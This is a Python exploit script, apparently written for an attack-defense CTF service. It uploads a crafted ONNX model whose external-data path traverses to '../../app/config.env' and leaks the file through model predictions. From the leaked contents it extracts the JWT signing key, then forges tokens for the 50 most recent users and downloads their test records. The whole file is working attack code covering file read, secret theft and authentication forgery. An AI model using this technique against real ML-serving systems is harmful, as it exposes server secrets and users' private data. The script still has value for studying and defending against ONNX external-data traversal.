#!/usr/bin/env python3

import hashlib
import sys

import checklib
import requests
import onnx
import jwt
from Cryptodome.Cipher import ChaCha20


IP = sys.argv[1]
PORT = 8000

HOST = f'http://{IP}:{PORT}/api'


def register(session: requests.Session, username: str, password: str, vaccine_name: str):
    resp = session.post(HOST + '/register', json={
        'username': username,
        'password': password,
        'email': username + '@cbsctf.live',
        'vaccine_name': vaccine_name
    })
    return resp.json()


def list_latest_users(limit=50):
    resp = requests.get(HOST + '/users', params={'limit': limit})
    return resp.json()


class ApiHelper:
    PORT = 8000

    def __init__(self, host, api_token):
        self.base_url = f'http://{host}:{self.PORT}/api'
        self.api_token = api_token

    def get_user_info(self):
        return requests.get(self.base_url + '/userinfo', headers={'X-Api-Token': self.api_token}).json()

    def upload_model(self, model_path):
        info = self.get_user_info()
        vaccine_key = info['vaccine_info']['vaccine_key']
        with open(model_path, 'rb') as f:
            encrypted_model = self._encrypt_model(f.read(), vaccine_key)
            return self._upload_model(encrypted_model)

    def _encrypt_model(self, model_bytes, model_key):
        KEY_SIZE = 32
        NONCE_SIZE = 12

        if len(model_key) != KEY_SIZE * 2 + NONCE_SIZE * 2:
            raise ValueError("invalid encryption key")
        key = b''.fromhex(model_key[:KEY_SIZE * 2])
        cha = ChaCha20.new(key=key, nonce=b''.fromhex(model_key[KEY_SIZE * 2:]))
        return cha.encrypt(model_bytes)

    def _upload_model(self, model_bytes):
        resp = requests.post(self.base_url + '/vaccine/upload', files={'file': model_bytes},
                             headers={'X-Api-Token': self.api_token})
        return resp.json()

    def _get_captcha(self):
        return requests.get(self.base_url + '/captcha/get').json()

    def _send_captcha(self, key, answer):
        return requests.post(self.base_url + '/captcha/validate', json={'key': key, 'answer': answer}).json()

    def _send_prediction(self, vaccine_id, data, captcha_token):
        resp = requests.post(self.base_url + '/vaccine/' + vaccine_id + '/test',
                             json=data, headers={'X-Captcha-Token': captcha_token})
        return resp.json()

    def send_prediction(self, vaccine_id, data):
        captcha_info = self._get_captcha()
        answer = self.mine(captcha_info['captcha_challenge'], 5)
        resp = self._send_captcha(captcha_info['captcha_key'], str(answer))
        return self._send_prediction(vaccine_id, data, resp['captcha_token'])

    def mine(self, message, size):
        for x in range(10 ** 100):
            s = message + str(x)
            s = s.encode()
            hsh = hashlib.sha256(s).hexdigest()
            if hsh.startswith('0' * size):
                return x


def build_sploit_model(out_path, path="../../../../app/config.env", bytes_to_leak=5):
    tensor = onnx.helper.TensorProto()
    tensor.name = "const"
    tensor.data_type = onnx.helper.TensorProto.DataType.INT64
    bytes_size = bytes_to_leak
    tensor.dims.extend([bytes_size])
    tensor.data_location = onnx.TensorProto.EXTERNAL
    entry = tensor.external_data.add()
    entry.key = "location"
    entry.value = path
    nodes = [
        onnx.helper.make_node("Add", ["const", "input"], ["output"]),
    ]
    inputs = [
        onnx.helper.make_tensor_value_info("input", onnx.TensorProto.INT64, ["N", bytes_to_leak]),
    ]
    outputs = [onnx.helper.make_tensor_value_info('output', onnx.TensorProto.INT64, ["N"])]
    graph = onnx.helper.make_graph(nodes, "poc_graph", inputs, outputs, initializer=[tensor])
    model_def = onnx.helper.make_model(graph,
                                       producer_name='@jnovikov')

    s = onnx._serialize(model_def)
    onnx._save_bytes(s, out_path)


if __name__ == '__main__':
    sess = checklib.get_initialized_session()
    username, password = checklib.rnd_username(), checklib.rnd_password()
    print(username, password)
    reg_resp = register(sess, username, password, 'totaly not a sploit')
    api_token = reg_resp['api_token']
    build_sploit_model("/tmp/model.onnx", path="../../../../../../app/config.env", bytes_to_leak=5)
    aph = ApiHelper(IP, api_token)
    user_info = aph.get_user_info()
    print(user_info)
    aph.upload_model("/tmp/model.onnx")
    #
    data_send = {'age': 0, 'sex': 0, 'rh': 0, 'blood_type': 0, 'sugar_level': 0, 'ssn': ''}
    pred_response = aph.send_prediction(user_info['vaccine_info']['vaccine_id'], data_send)
    leak = ''.join([b''.fromhex(hex(x)[2:])[::-1].decode() for x in pred_response['prediction']])
    jwt_key = leak[leak.find('=') + 1:leak.find('\n')]
    print(jwt_key)

    latest_users = list_latest_users(50)
    for u in latest_users:
        gen_token = jwt.encode({'user_id': u['user_id']}, jwt_key, algorithm='HS256')
        res = requests.get(HOST + '/vaccine/tests', cookies={'Api-Token': gen_token})
        print(res.json())

